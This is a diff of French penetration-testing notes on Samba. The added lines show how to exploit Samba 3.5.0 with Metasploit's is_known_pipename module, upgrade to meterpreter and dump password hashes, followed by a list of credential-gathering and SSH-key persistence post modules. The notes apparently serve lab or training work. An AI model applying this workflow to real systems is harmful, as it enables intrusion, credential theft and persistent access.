@@ -41,6 +41,20 @@ Si l'exploit fonctionne, nous obtenons un meterpreter.
 ### Samba V3.5.0 est vulnérable  
 `exploit/linux/samba/is_known_pipename` il permet d'obtenir un shell, mais pour avoir un meterpreter : `post/multi/manage/shell_to_meterpreter`  
 
+OU :  
+`exploit/linux/samba/is_known_pipename`, puis `sessions -u 1` pour la passer en meterpreter. Ensuite use `post/linux/gather/hashdump`, lui set la session du meterpreter, puis run, on doit dump les hash dans loot.  
+Différents modules de dumps pour linux.  
+``post/multi/gather/ssh_creds``
+``post/multi/gather/docker_creds``  
+``post/linux/gather/hashdump``  
+``post/linux/gather/ecryptfs_creds``  
+``post/linux/gather/enum_psk``  
+``post/linux/gather/enum_xchat``  
+``post/linux/gather/phpmyadmin_credsteal``  
+``post/linux/gather/pptpd_chap_secrets``  
+``post/linux/manage/sshkey_persistence``  
+
+
 
 ## smbmap
 Permet de lister les partages
